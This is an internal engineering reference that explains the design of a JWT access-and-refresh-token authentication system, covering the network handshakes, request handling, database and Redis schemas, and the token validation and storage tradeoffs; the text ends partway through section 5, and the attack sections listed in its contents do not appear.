# JWT Authentication System — Internal Engineering & Security Document

**Classification:** Internal Engineering Reference  
**Audience:** Senior Engineers, Security Engineers, Systems Architects  
**Scope:** Full-stack breakdown of a production JWT Authentication System (Access + Refresh Token pattern)

---

## Table of Contents

1. [User Journey (Narrative)](#1-user-journey-narrative)
2. [Network Layer Flow](#2-network-layer-flow)
3. [Application Layer Flow](#3-application-layer-flow)
4. [Backend Architecture](#4-backend-architecture)
5. [Authentication & Authorization Flow](#5-authentication--authorization-flow)
6. [Data Flow](#6-data-flow)
7. [Security Controls](#7-security-controls)
8. [Attack Surface Mapping](#8-attack-surface-mapping)
9. [Attack Scenarios (Very Detailed)](#9-attack-scenarios-very-detailed)
10. [Failure Points](#10-failure-points)
11. [Mitigations](#11-mitigations)
12. [Observability](#12-observability)
13. [Scaling Considerations](#13-scaling-considerations)
14. [Interview Questions](#14-interview-questions)

---

## 1. User Journey (Narrative)

### System Topology Assumed

We describe a production-grade system:
- **Frontend**: React SPA served from a CDN.
- **API Gateway**: nginx or AWS ALB fronting the auth service.
- **Auth Service**: Issues and validates JWTs. Stateless validation of access tokens; stateful refresh token registry.
- **Resource API**: A separate microservice that consumes access tokens.
- **Database**: PostgreSQL for user records and refresh token metadata.
- **Cache**: Redis for token blacklist / revocation list.

JWT issuance uses **RS256** (asymmetric signing): the Auth Service signs with an RSA private key; Resource APIs verify with the corresponding public key. This means Resource APIs never need access to the private key — a critical security architecture decision.

---

### Step-by-Step Narrative

#### T+0ms — User submits login form

User enters email and password. The browser's JavaScript intercepts the form submit (preventing a page reload) and fires:

```
POST https://api.example.com/auth/login
Content-Type: application/json
{"email": "user@example.com", "password": "hunter2"}
```

Nothing has happened yet with JWTs. This is a standard credential submission. The browser has not spoken to any auth service yet — the DNS lookup and TCP+TLS handshake are about to begin.

**What the user sees:** A loading spinner.  
**What actually happens:** DNS resolution, TCP handshake, TLS negotiation, HTTP request queued in the browser's network stack.

---

#### T+~50ms — Request reaches Auth Service

After DNS + TCP + TLS (detailed in Section 2), the HTTP request arrives at the Auth Service's `POST /auth/login` handler.

The Auth Service:
1. Parses the JSON body. Extracts `email` and `password`.
2. Looks up the user record in PostgreSQL by email (indexed).
3. Retrieves the stored password hash (bcrypt or Argon2id).
4. Runs the KDF (key derivation function) against the supplied password: `Argon2id(password, stored_salt)`. This is intentionally expensive — ~100–300ms of CPU time.
5. Compares the derived hash to the stored hash using a **constant-time comparison** function (e.g., `hmac.compare_digest` in Python, `crypto.timingSafeEqual` in Node.js). This prevents timing attacks.

---

#### T+~200–400ms — Auth Service issues tokens (on success)

If the password is correct, the Auth Service:

**Generates the Access Token (JWT):**

```
Header:  {"alg": "RS256", "typ": "JWT", "kid": "key-2024-01"}
Payload: {
  "iss": "https://auth.example.com",
  "sub": "user-uuid-abc123",
  "aud": ["https://api.example.com"],
  "iat": 1700000000,
  "exp": 1700000900,        // 15 minutes from now
  "jti": "jwt-uuid-xyz789", // unique JWT ID for potential revocation
  "email": "user@example.com",
  "roles": ["user"],
  "scope": "read write"
}
```

The header and payload are each base64url-encoded (no padding). They are concatenated with a `.` separator. The RS256 signature is computed:

```
signing_input = base64url(header) + "." + base64url(payload)
signature = RSA_PKCS1_v1.5_Sign(SHA256(signing_input), private_key)
JWT = signing_input + "." + base64url(signature)
```

The complete JWT is three base64url-encoded segments joined by dots. Typical size: 600–900 bytes for RS256.

**Generates the Refresh Token:**

The refresh token is NOT a JWT. It is a cryptographically random 256-bit value:

```
refresh_token = base64url(CSPRNG(32 bytes))
```

The Auth Service stores a record in PostgreSQL:

```sql
INSERT INTO refresh_tokens (
  token_hash,      -- SHA-256(refresh_token) — never store plaintext
  user_id,
  issued_at,
  expires_at,      -- 30 days
  family_id,       -- for refresh token rotation/reuse detection
  device_info,     -- user agent hash, IP hash
  revoked_at       -- NULL initially
)
```

The plaintext refresh token is returned to the client once and never stored again. Only its hash is persisted.

**Response:**

```http
HTTP/2 200
Content-Type: application/json
Cache-Control: no-store
Pragma: no-cache

{
  "access_token": "eyJhbGci...",
  "token_type": "Bearer",
  "expires_in": 900,
  "refresh_token": "dGhpcyBpcyBhIHJhbmRvbSB0b2tlbg..."
}
```

`Cache-Control: no-store` prevents the response from being cached by any intermediary (CDN, proxy). The refresh token appears in the body — where exactly it's stored on the client is a critical security decision (discussed in Section 5).

---

#### T+~400ms — Client stores tokens and accesses resources

The JavaScript client:
1. Stores the access token in memory (a JavaScript variable or React state — NOT in `localStorage`).
2. Stores the refresh token in an `HttpOnly; Secure; SameSite=Strict` cookie via a separate `/auth/session` endpoint, or in `localStorage` if the threat model accepts XSS risk (a significant tradeoff — discussed in Section 5).
3. Immediately (or on first resource request) uses the access token:

```http
GET /api/v1/user/profile HTTP/2
Host: api.example.com
Authorization: Bearer eyJhbGci...
```

The Resource API receives this request. It does NOT call the Auth Service. It validates the JWT locally using the Auth Service's public key (fetched once and cached). This is a pure cryptographic operation taking ~0.5–2ms. No network call. No database lookup. This is the core scalability advantage of JWTs.

---

#### T+900s (~15 minutes later) — Access token expiry and silent refresh

The access token expires. The client's JavaScript (via an axios interceptor, a fetch wrapper, or a timer) detects this — either proactively (checking `exp` before each request) or reactively (receiving a 401 from the API).

Client sends a refresh request:

```http
POST /auth/token/refresh HTTP/2
Host: api.example.com
Content-Type: application/json
Cookie: refresh_token=dGhpcyBpcyBhIHJhbmRvbSB0b2tlbg...
```

(Or in the request body, depending on storage strategy.)

Auth Service:
1. Extracts the refresh token from the cookie/body.
2. Computes `SHA-256(refresh_token)` to get the hash.
3. Queries PostgreSQL for a record with this hash that is not revoked and not expired.
4. If found: issues a new access token AND a new refresh token (rotation).
5. Marks the old refresh token as consumed (sets `revoked_at`).
6. Inserts the new refresh token record (same `family_id`).
7. Returns new `access_token` and `refresh_token`.

The user sees nothing. Their session continues seamlessly.

---

#### Logout

Client sends:

```http
POST /auth/logout HTTP/2
Authorization: Bearer eyJhbGci...
Cookie: refresh_token=...
```

Auth Service:
1. Looks up and revokes the refresh token (sets `revoked_at`).
2. Adds the access token's `jti` to the Redis blacklist with TTL equal to remaining validity time of the access token.
3. Returns 204 No Content.

Client clears the in-memory access token and the refresh token cookie. The access token is now blacklisted; any further use will be rejected even before expiry.

---

## 2. Network Layer Flow

### DNS Resolution

When the browser first contacts `api.example.com`:

```
Browser DNS cache
  │ MISS
  ▼
OS stub resolver (/etc/resolv.conf → 10.0.0.1)
  │ MISS
  ▼
Corporate/ISP recursive resolver (or 8.8.8.8 / 1.1.1.1)
  │
  ├── Query root nameservers (anycast, 13 logical roots)
  │     Response: "ask .com TLD NS"
  │
  ├── Query .com TLD nameservers (Verisign)
  │     Response: "ask ns1.example.com, ns2.example.com"
  │
  └── Query example.com authoritative NS
        Response: A record → 203.0.113.42 (API Gateway IP)
        TTL: 300 seconds
```

**DNSSEC considerations:** If the zone is DNSSEC-signed, the resolver validates RRSIG records against the chain of trust from the root. Validation failures result in SERVFAIL — the client gets no IP. This is a hard dependency on the DNS trust chain.

**DNS-over-HTTPS (DoH) / DNS-over-TLS (DoT):** Increasingly common in corporate and browser-level configs. Changes the transport (encrypts DNS queries so ISPs can't observe them) but not the resolution mechanics.

**Latency:** Cold: 30–100ms. Warm cache: 0ms. TTL should be tuned: too short causes excessive resolution latency; too long delays failover.

---

### TCP 3-Way Handshake

```
Client                            API Gateway (203.0.113.42:443)
  │                                          │
  │  SYN (seq=1000, MSS=1460, SACK, WS=256) │
  │─────────────────────────────────────────>│
  │                                          │
  │  SYN-ACK (seq=5000, ack=1001, MSS=1460)  │
  │<─────────────────────────────────────────│
  │                                          │
  │  ACK (ack=5001)                          │
  │─────────────────────────────────────────>│
  │  [connection established — 1 RTT]        │
```

**Key parameters:**
- **MSS (Maximum Segment Size)**: Negotiated via SYN options. Typically 1460 bytes for Ethernet (1500 byte MTU − 20 IP header − 20 TCP header). Affects how much data fits in each packet.
- **SACK (Selective Acknowledgment)**: Allows the receiver to acknowledge non-contiguous blocks, improving recovery from packet loss.
- **Window Scaling**: TCP window size is 16-bit by default (max 65535 bytes). Window scaling extends this to allow large bandwidth-delay product connections (e.g., high-speed intercontinental links).
- **Initial Congestion Window (ICW)**: Linux default is 10 segments (~14KB). The first 14KB of data flows without waiting for ACKs (slow start phase).

**TCP Fast Open (TFO):** Subsequent connections to the same server can include data in the SYN packet using a cached TFO cookie, eliminating the handshake RTT for the first byte. Not universally deployed due to middle-box interference.

---

### TLS 1.3 Handshake (Detailed)

TLS 1.3 reduces the handshake to **1 RTT** (vs 2 RTT in TLS 1.2):

```
Client                                              Server
  │                                                    │
  │  ClientHello                                        │
  │  ─ TLS version: 1.3                                │
  │  ─ Supported cipher suites:                        │
  │      TLS_AES_256_GCM_SHA384                        │
  │      TLS_AES_128_GCM_SHA256                        │
  │      TLS_CHACHA20_POLY1305_SHA256                  │
  │  ─ key_share: X25519 ephemeral public key (32B)    │
  │  ─ SNI: api.example.com                            │
  │  ─ ALPN: h2, http/1.1                              │
  │  ─ session_ticket (for 0-RTT resumption)           │
  │──────────────────────────────────────────────────> │
  │                                                    │
  │  ServerHello                                       │
  │  ─ Selected cipher: TLS_AES_256_GCM_SHA384         │
  │  ─ key_share: server's X25519 ephemeral pub key    │
  │                                                    │
  │  {EncryptedExtensions}                             │
  │  ─ ALPN: h2                                        │
  │  ─ max_fragment_length                             │
  │                                                    │
  │  {Certificate}                                     │
  │  ─ X.509 cert for api.example.com                  │
  │  ─ Intermediate CA cert                            │
  │  ─ OCSP staple (revocation proof)                  │
  │                                                    │
  │  {CertificateVerify}                               │
  │  ─ Signature over handshake transcript             │
  │  ─ Proves server owns the cert's private key       │
  │                                                    │
  │  {Finished}                                        │
  │  ─ HMAC over entire handshake transcript           │
  │<────────────────────────────────────────────────── │
  │                                                    │
  │  {Finished}                                        │
  │  ─ Client's HMAC over handshake transcript         │
  │  [Application Data can now flow]                   │
  │──────────────────────────────────────────────────> │
```

**Key derivation (what actually happens mathematically):**

1. Both sides compute the same ECDH shared secret:
   - Client: `shared = server_pubkey * client_privkey` (elliptic curve scalar multiplication on X25519)
   - Server: `shared = client_pubkey * server_privkey`
   - Same result due to ECDH commutativity. The private keys never cross the wire.

2. `shared` is passed through **HKDF** (HMAC-based Key Derivation Function, RFC 5869) to derive:
   - `handshake_secret` → keys for encrypting the handshake itself
   - `master_secret` → keys for application data
   - Separate keys for each direction (client write, server write)
   - Separate keys for each purpose (encryption key, IV/nonce)

3. **AEAD** (Authenticated Encryption with Associated Data): AES-256-GCM encrypts application data with authentication. A 16-byte authentication tag is appended to each record. Any bit flip in transit is detected — decryption fails and the connection is torn down.

**Certificate validation chain:**

```
Root CA (Mozilla/OS trust store)
  └── Intermediate CA (Let's Encrypt E1 / DigiCert)
        └── api.example.com leaf certificate
              ─ Subject: CN=api.example.com
              ─ SANs: api.example.com, *.example.com
              ─ NotBefore: 2024-01-01
              ─ NotAfter: 2024-04-01 (90-day cert, Let's Encrypt pattern)
              ─ OCSP URL: http://ocsp.letsencrypt.org
              ─ CT logs: embedded SCTs from Google Argon2024
```

Browser validates:
1. Signature chain up to a trusted root in the OS/browser trust store.
2. `NotAfter` has not passed.
3. Hostname matches SAN list (wildcard or exact).
4. OCSP staple is valid (or OCSP check performed online if no staple).
5. SCTs (Signed Certificate Timestamps) from at least 2 CT logs verify the cert is publicly logged.

**Failure modes in TLS:**
- Certificate expired → hard failure, no workaround for the user.
- Certificate CN/SAN mismatch → hard failure.
- OCSP responder unavailable, no staple → soft failure (most browsers allow, per OCSP soft-fail policy). This is a known weakness: an attacker who revokes a cert and blocks OCSP still allows connections to proceed.
- Intermediate cert not served → validation failure. Servers must serve the full chain.

---

### Full Network Flow Diagram

```
  USER BROWSER                          API GATEWAY                    AUTH SERVICE
       │                                     │                              │
  ─── Phase 1: DNS ───────────────────────────────────────────────────────────────
       │                                     │                              │
  DNS query: api.example.com                 │                              │
  ────────────────────────────────── Recursive Resolver ──────────────────────── 
  ◄── 203.0.113.42                           │                              │
       │                                     │                              │
  ─── Phase 2: TCP ───────────────────────────────────────────────────────────────
       │                                     │                              │
  SYN ────────────────────────────────────► │                              │
  ◄── SYN-ACK ─────────────────────────────│                              │
  ACK ────────────────────────────────────► │                              │
       │                                     │                              │
  ─── Phase 3: TLS ───────────────────────────────────────────────────────────────
       │                                     │                              │
  ClientHello ────────────────────────────► │                              │
  ◄── ServerHello + Cert + Finished ────────│                              │
  Finished ───────────────────────────────► │                              │
       │  [Encrypted channel established]    │                              │
       │                                     │                              │
  ─── Phase 4: Login Request ─────────────────────────────────────────────────────
       │                                     │                              │
  POST /auth/login {email, password} ──────► │                              │
       │                          [Gateway routes to Auth Service]          │
       │                                     │──── TCP/TLS ────────────────►│
       │                                     │  POST /auth/login            │
       │                                     │                     [Hash password]
       │                                     │                     [Issue JWT]
       │                                     │                     [Store refresh]
       │                                     │◄── 200 {access_token,        │
       │                                     │         refresh_token}        │
  ◄── 200 {access_token, refresh_token} ────│                              │
       │                                     │                              │
  ─── Phase 5: Resource Access ───────────────────────────────────────────────────
       │                                     │                              │
  GET /api/profile                           │                              │
  Authorization: Bearer <JWT> ─────────────► │                              │
       │                          [Gateway validates JWT locally             │
       │                           OR forwards to Resource API]             │
       │                                     │                              │
  ◄── 200 {profile data} ───────────────────│                              │
       │                                     │                              │
  ─── Phase 6: Token Refresh ─────────────────────────────────────────────────────
       │                                     │                              │
  POST /auth/token/refresh                   │                              │
  Cookie: refresh_token=... ───────────────► │                              │
       │                                     │────────────────────────────► │
       │                                     │                    [Hash, lookup]
       │                                     │                    [Rotate token]
       │                                     │                    [Issue new JWT]
       │                                     │◄─────────────────────────────│
  ◄── 200 {new_access_token, new_refresh} ──│                              │
```

---

### Latency Budget

| Operation | Typical Latency |
|---|---|
| DNS (cold) | 30–100ms |
| TCP handshake | 1× RTT (20–60ms) |
| TLS 1.3 handshake | 1× RTT (0-RTT: 0ms) |
| Login (password hash) | 100–300ms (intentional Argon2id cost) |
| JWT issuance (RSA sign) | 1–5ms |
| Access token validation (RSA verify) | 0.5–2ms |
| Refresh token DB lookup | 1–10ms |
| **Total login (excl. user interaction)** | **~200–500ms** |
| **Resource request with valid JWT** | **~1–5ms (validation only)** |

---

## 3. Application Layer Flow

### Login Request — Parsing and Processing

**Inbound HTTP/2 request:**

```http
POST /auth/login HTTP/2
Host: api.example.com
Content-Type: application/json
Content-Length: 51
Accept: application/json
Origin: https://app.example.com
X-Request-ID: req-uuid-abc123

{"email":"user@example.com","password":"hunter2"}
```

**Headers of note:**
- `Content-Type: application/json`: The body parser activates JSON deserialization. If this header is missing or set to `text/plain`, a strict body parser will reject the request with 415 Unsupported Media Type.
- `Origin`: Validated by the CORS middleware. Must be in the allowed origins list. If not, the preflight response will deny the actual request.
- `X-Request-ID`: Passed through to all downstream services and included in all log lines for request correlation.

**CORS preflight (if cross-origin):**

Before the actual POST, the browser fires an OPTIONS preflight:

```http
OPTIONS /auth/login HTTP/2
Origin: https://app.example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type
```

Server responds:

```http
HTTP/2 204
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: POST, OPTIONS
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400
Vary: Origin
```

`Vary: Origin` is critical — tells caches that the response varies by the Origin header. Without it, a cached CORS response for origin A might be served to origin B.

**Body parsing:**

The JSON body is parsed. The server:
1. Reads the raw bytes from the request body.
2. Validates `Content-Length` against actual bytes received (prevents body truncation attacks).
3. JSON-parses the bytes. Extracts `email` and `password`.
4. Validates email format (regex, but not too strict — don't reject valid edge-case emails).
5. Validates password: minimum length check only. Never maximum length check — that can be a DoS vector (see Section 9) — but set a hard upper limit (e.g., 1024 chars) to prevent bcrypt DoS.

**Rate limiting:**

Before password validation begins, the rate limiter middleware checks:

```
Key: "login_attempts:" + SHA256(email)   // or IP-based, or both
Limit: 5 attempts per 15-minute sliding window
Store: Redis INCR with EXPIREAT
```

If limit exceeded: return `429 Too Many Requests` with `Retry-After` header. Increment a separate counter for monitoring.

---

### Authenticated Resource Request — Header Parsing

```http
GET /api/v1/user/profile HTTP/2
Host: api.example.com
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImtleS0yMDI0LTAxIn0.eyJpc3MiOiJodHRwczovL2F1dGguZXhhbXBsZS5jb20iLCJzdWIiOiJ1c2VyLXV1aWQtYWJjMTIzIiwiYXVkIjpbImh0dHBzOi8vYXBpLmV4YW1wbGUuY29tIl0sImlhdCI6MTcwMDAwMDAwMCwiZXhwIjoxNzAwMDAwOTAwfQ.signature
Accept: application/json
X-Request-ID: req-uuid-def456
```

**JWT extraction:**

The `Authorization` header value is split on the first space character:

```
scheme = "Bearer"
token  = "eyJhbGci..."
```

If the scheme is not `Bearer` (case-insensitive), return 401. If the token is missing, return 401. Do NOT return 400 (Bad Request) — the presence/absence of credentials is an authentication concern, not a request format concern.

**JWT validation pipeline (detailed in Section 5):**

The token is parsed, signature verified, and claims extracted. If valid, the `sub` (user ID), `roles`, `scope`, and `jti` are attached to the request context and passed to the route handler.

---

### Response Construction

For a successful profile request:

```http
HTTP/2 200
Content-Type: application/json; charset=utf-8
Cache-Control: private, no-store
X-Request-ID: req-uuid-def456
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
Content-Security-Policy: default-src 'none'

{
  "id": "user-uuid-abc123",
  "email": "user@example.com",
  "display_name": "Jane Doe",
  "created_at": "2024-01-15T10:00:00Z"
}
```

**Security headers:**
- `X-Content-Type-Options: nosniff`: Prevents MIME-type sniffing. Browser treats the response as declared Content-Type only.
- `X-Frame-Options: DENY`: Prevents clickjacking. The response cannot be loaded in an iframe.
- `Strict-Transport-Security`: Forces HTTPS for 2 years on all subdomains. The `preload` flag indicates the domain can be submitted to browser preload lists (hardcoded HTTPS-only in browser builds).
- `Content-Security-Policy: default-src 'none'`: API responses (JSON) don't load any sub-resources; this is belt-and-suspenders for misconfigured clients.

---

## 4. Backend Architecture

### Service Map

```
                        ┌──────────────────────────────────────────────────────┐
                        │                 RP Application Stack                 │
                        │                                                      │
Internet ──────────────►│ WAF / DDoS Protection (Cloudflare / AWS Shield)     │
                        │       │                                              │
                        │       ▼                                              │
                        │ API Gateway / Load Balancer (nginx / AWS ALB)        │
                        │       │                                              │
                        │       ├──────────────────────────────────────┐       │
                        │       ▼                                      ▼       │
                        │ Auth Service                       Resource APIs     │
                        │ (Issues & refreshes tokens)        (Consume tokens)  │
                        │       │                                      │       │
                        │       ├── PostgreSQL (users, refresh tokens) │       │
                        │       ├── Redis (blacklist, rate limits)     │       │
                        │       ├── Secrets Manager (RSA private key)  │       │
                        │       └── Event Bus (audit events) ──────────┘       │
                        │                          │                           │
                        │                    Kafka / SQS                       │
                        │                          │                           │
                        │                    Audit Log Service                 │
                        │                    (SIEM ingest)                     │
                        └──────────────────────────────────────────────────────┘

                        ┌──────────────────────────────────────────────────────┐
                        │              Public Key Distribution                 │
                        │  GET /.well-known/jwks.json                          │
                        │  (Auth Service serves public keys for consumers)     │
                        └──────────────────────────────────────────────────────┘
```

### Auth Service — Internal Components

**Route handlers (synchronous, on critical path):**
- `POST /auth/login` → credential validation, token issuance.
- `POST /auth/token/refresh` → refresh token rotation.
- `POST /auth/logout` → token revocation.
- `GET /.well-known/jwks.json` → public key distribution.

**Background workers (asynchronous, off critical path):**
- **Refresh token cleanup worker:** Scheduled job (cron, every hour) deletes expired refresh token records from PostgreSQL. Keeps the table from growing unboundedly.
- **Key rotation worker:** Scheduled job (monthly) generates a new RSA key pair. Adds the new public key to the JWKS endpoint while keeping the old key for the duration of existing token validity. Retires old keys.
- **Audit log publisher:** Consumes from an in-process queue and publishes events to Kafka. Decoupled from the request path so that slow Kafka writes don't add latency to login requests.

**Dependency graph:**

```
Auth Service
  ├── PostgreSQL (synchronous, on critical path for login/refresh/logout)
  ├── Redis (synchronous, on critical path for rate limiting + blacklist check)
  ├── AWS KMS or Vault (startup: fetch RSA private key, cache in memory)
  └── Kafka (asynchronous, off critical path)
```

---

### Database Schema

**users table:**

```sql
CREATE TABLE users (
  id            UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  email         VARCHAR(255) UNIQUE NOT NULL,
  email_verified BOOLEAN NOT NULL DEFAULT false,
  password_hash  VARCHAR(255) NOT NULL,   -- Argon2id hash string including salt
  created_at    TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  updated_at    TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  last_login_at TIMESTAMPTZ,
  is_active     BOOLEAN NOT NULL DEFAULT true,
  roles         TEXT[] NOT NULL DEFAULT '{user}'
);

CREATE UNIQUE INDEX idx_users_email ON users(email);
```

**refresh_tokens table:**

```sql
CREATE TABLE refresh_tokens (
  id          UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  token_hash  CHAR(64) NOT NULL UNIQUE,  -- SHA-256 hex of the raw token
  user_id     UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  family_id   UUID NOT NULL,             -- Groups a rotation chain; reuse detection
  issued_at   TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  expires_at  TIMESTAMPTZ NOT NULL,      -- NOW() + 30 days
  last_used_at TIMESTAMPTZ,
  revoked_at  TIMESTAMPTZ,               -- NULL if active
  ip_hash     CHAR(64),                 -- SHA-256 of client IP (for anomaly detection)
  ua_hash     CHAR(64)                  -- SHA-256 of User-Agent
);

CREATE INDEX idx_rt_token_hash ON refresh_tokens(token_hash);
CREATE INDEX idx_rt_user_id    ON refresh_tokens(user_id);
CREATE INDEX idx_rt_family_id  ON refresh_tokens(family_id);
CREATE INDEX idx_rt_expires_at ON refresh_tokens(expires_at);  -- for cleanup job
```

The `family_id` is set at first issuance and propagated through all rotations. If an already-revoked token in a family is presented, the Auth Service detects a reuse attack and revokes ALL tokens in that family (all active sessions for that family).

---

### Caching Layers

**Redis for rate limiting:**

```
Key:   "rl:login:" + sha256(email)
Type:  String (counter)
TTL:   900 seconds (sliding window reset)
Value: integer (attempt count)

MULTI
  INCR "rl:login:" + sha256(email)
  EXPIRE "rl:login:" + sha256(email) 900
EXEC
```

Lua scripting (EVAL) is used to make the INCR + EXPIRE atomic. Without atomicity, a race condition between INCR and EXPIRE can leave a key without a TTL (effectively permanent lockout).

**Redis for JWT blacklist:**

```
Key:   "blacklist:jti:" + jti
Type:  String
Value: "1"
TTL:   Remaining TTL of the JWT at logout time
         = jwt.exp - time.now()
```

The blacklist entry expires automatically when the JWT would have expired anyway. This keeps the blacklist lean — only entries for unexpired but revoked JWTs exist. Expired JWTs are rejected by their `exp` claim without a Redis lookup.

**In-memory JWKS cache (in Resource APIs):**

The RSA public key used for JWT verification is fetched once at startup from `/.well-known/jwks.json` and cached in memory. It is refreshed:
- On a scheduled interval (every 6 hours).
- Immediately when a JWT contains a `kid` not found in the current cache (triggers a fresh JWKS fetch).

Never evict the cache without fetching a replacement first. A missing public key means all JWT validations fail — a full service outage.

---

### Sync vs. Async Flows

| Operation | Sync/Async | Reason |
|---|---|---|
| Password hash verification | Sync | User is waiting; blocking is intentional (KDF is the delay) |
| JWT issuance (RSA sign) | Sync | <5ms; user waiting |
| Refresh token DB write | Sync | Must complete before returning token |
| Redis blacklist write (logout) | Sync | Must complete before returning 204; otherwise a race where the token is used after logout |
| Audit event publish | Async | Slow Kafka write must not add latency to auth critical path |
| Expired token cleanup | Async | Scheduled background job; no user impact |
| Key rotation | Async | Background worker with coordination |
| Email notification (first login, new device) | Async | Non-blocking; eventual delivery is acceptable |

---

## 5. Authentication & Authorization Flow

### JWT Structure — Every Field Matters

**Header:**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "key-2024-01"
}
```

- `alg`: Signing algorithm. RS256 = RSA + SHA-256. The validator must NOT accept whatever `alg` appears here; it must be hardcoded to accept only RS256 (or the specific algorithms your system uses). Accepting the header's `alg` blindly is the algorithm confusion vulnerability.
- `typ`: Optional marker. Some validators use this; ignore if your library doesn't.
- `kid`: Key ID. When multiple signing keys are in circulation (during key rotation), `kid` tells the validator which public key to use for verification. Without `kid`, the validator must try all known keys until one works (brute-force key selection) or fail.

**Payload:**
```json
{
  "iss": "https://auth.example.com",
  "sub": "user-uuid-abc123",
  "aud": ["https://api.example.com"],
  "iat": 1700000000,
  "exp": 1700000900,
  "nbf": 1700000000,
  "jti": "jwt-uuid-xyz789",
  "email": "user@example.com",
  "roles": ["user", "admin"],
  "scope": "read write profile"
}
```

- `iss` (Issuer): Must exactly match the expected issuer. Prevents tokens from one service being used at another.
- `sub` (Subject): The user's stable internal ID. This is the user identifier. Never use email as `sub` — it can change.
- `aud` (Audience): The intended recipient(s). Resource APIs must validate that their own identifier appears in `aud`. If a token has `aud: ["service-a"]`, service-b must reject it even if the signature is valid.
- `iat` (Issued At): Token creation time. Used for calculating age.
- `exp` (Expiration Time): Hard expiry. Validators must reject tokens where `exp` < current time. Clock skew allowance: at most 60 seconds.
- `nbf` (Not Before): Token not valid before this time. Useful for pre-issued tokens with a future activation time. Often omitted but should equal `iat`.
- `jti` (JWT ID): Unique identifier for this specific token. Enables precise blacklisting at logout. Without `jti`, blacklisting requires the entire token string as the key (larger Redis keys).
- `roles`, `scope`: Authorization claims. Used by resource APIs to determine what the caller is allowed to do. These are trusted at face value — they're embedded in the signed token. Changing a user's role in the DB does NOT automatically change their active JWTs. This is a fundamental JWT tradeoff.

---

### JWT Validation Pipeline (Resource API Side)

Every incoming request with a Bearer token goes through this pipeline:

```
1. EXTRACT
   ─────────────────────────────────────────────────────────
   header_raw, payload_raw, sig_raw = token.split(".")
   header  = base64url_decode(header_raw)
   payload = base64url_decode(payload_raw)
   sig     = base64url_decode(sig_raw)

2. ALGORITHM CHECK (before anything else)
   ─────────────────────────────────────────────────────────
   if header.alg not in ALLOWED_ALGORITHMS:  // ["RS256"]
       raise InvalidToken("Algorithm not allowed")
   // NEVER trust header.alg to select the verification algorithm

3. KEY SELECTION
   ─────────────────────────────────────────────────────────
   kid = header.kid
   pub_key = jwks_cache.get(kid)
   if pub_key is None:
       jwks_cache.refresh()  // one-time forced refresh
       pub_key = jwks_cache.get(kid)
       if pub_key is None:
           raise InvalidToken("Unknown key ID")

4. SIGNATURE VERIFICATION
   ─────────────────────────────────────────────────────────
   signing_input = header_raw + "." + payload_raw
   if not RSA_verify(SHA256(signing_input), sig, pub_key):
       raise InvalidToken("Signature invalid")

5. CLAIMS VALIDATION
   ─────────────────────────────────────────────────────────
   now = current_unix_timestamp()
   if payload.exp < now - CLOCK_SKEW_TOLERANCE:    // reject expired
       raise TokenExpired()
   if payload.nbf > now + CLOCK_SKEW_TOLERANCE:    // reject not-yet-valid
       raise InvalidToken("Token not yet valid")
   if payload.iss != EXPECTED_ISSUER:               // reject wrong issuer
       raise InvalidToken("Invalid issuer")
   if EXPECTED_AUDIENCE not in payload.aud:         // reject wrong audience
       raise InvalidToken("Invalid audience")

6. BLACKLIST CHECK (only if logout support is required)
   ─────────────────────────────────────────────────────────
   if redis.exists("blacklist:jti:" + payload.jti):
       raise TokenRevoked("Token has been revoked")

7. USER ACTIVE CHECK (optional, based on security requirements)
   ─────────────────────────────────────────────────────────
   // If user was disabled after token issuance,
   // JWT alone won't catch this. Either:
   // a) Accept the risk (user disabled → active until token exp)
   // b) Cache user active status in Redis, check here
   // c) Use short expiry (15 min) so the window is small

8. ATTACH TO REQUEST CONTEXT
   ─────────────────────────────────────────────────────────
   request.user_id = payload.sub
   request.roles   = payload.roles
   request.scope   = payload.scope
   request.jti     = payload.jti
```

Step 6 (blacklist check) introduces a Redis dependency into every resource request. This partially eliminates the "no database call" advantage of JWTs. This is a deliberate tradeoff: accepting that revoked tokens remain valid until expiry (typically 15 minutes) vs. adding a Redis lookup to every request. Many systems accept the 15-minute window and skip step 6.

---

### Session vs Token Logic — The Fundamental Tradeoff

| Property | Session (cookie + server-side state) | JWT (stateless) |
|---|---|---|
| Revocation | Immediate — delete session record | Delayed — until `exp` (or blacklist) |
| Scalability | Requires shared session store (Redis) | No shared state needed for validation |
| Payload size | Cookie: 32 bytes (session ID) | JWT: 600–900 bytes (headers on every request) |
| User data refresh | Immediate — read from DB on each request | Stale until re-issue |
| Logout | Reliable — delete session | Unreliable without blacklist |
| Horizontal scaling | Session store is a dependency | Fully stateless validation |
| Database calls per request | 1 (session lookup) | 0 (validation only) — or 1 if blacklist checked |

JWTs win on scalability when token lifetime is short (≤15 minutes) and the application can tolerate the revocation delay. Sessions win on revocation reliability when instantaneous logout is a hard requirement (e.g., financial, medical, government systems).

---

### Token Storage Options — Threat Matrix

| Storage Location | XSS Access | CSRF Vulnerable | Notes |
|---|---|---|---|
| `localStorage` | YES | NO | Any XSS reads the token; common mistake |
| `sessionStorage` | YES | NO | Same as localStorage; cleared on tab close |
| In-memory (JS var) | NO (if no XSS) | NO | Cleared on page reload; silent refresh needed |
| `HttpOnly` cookie | NO | YES | CSRF protection required (SameSite + token) |
| `HttpOnly; SameSite=Strict` | NO | Largely mitigated | Best default for most apps |
| Service Worker cache | YES | NO | Service workers can be XSS-exfiltrated |

**Recommended pattern (defense in depth):**
- Access token: In-memory JavaScript variable only. Never in `localStorage`. Short-lived (15 minutes).
- Refresh token: `HttpOnly; Secure; SameSite=Strict` cookie. The refresh token never touches JavaScript. A separate endpoint (`/auth/token/refresh`) reads the cookie server-side.

This pattern means:
- XSS cannot steal the refresh token (it's `HttpOnly`).
- XSS can exfiltrate the in-memory access token, but it expires in 15 minutes.
- CSRF against the refresh endpoint is mitigated by `SameSite=Strict`.

---

### Key Rotation

RSA key rotation is a multi-step process that must not cause downtime:

```
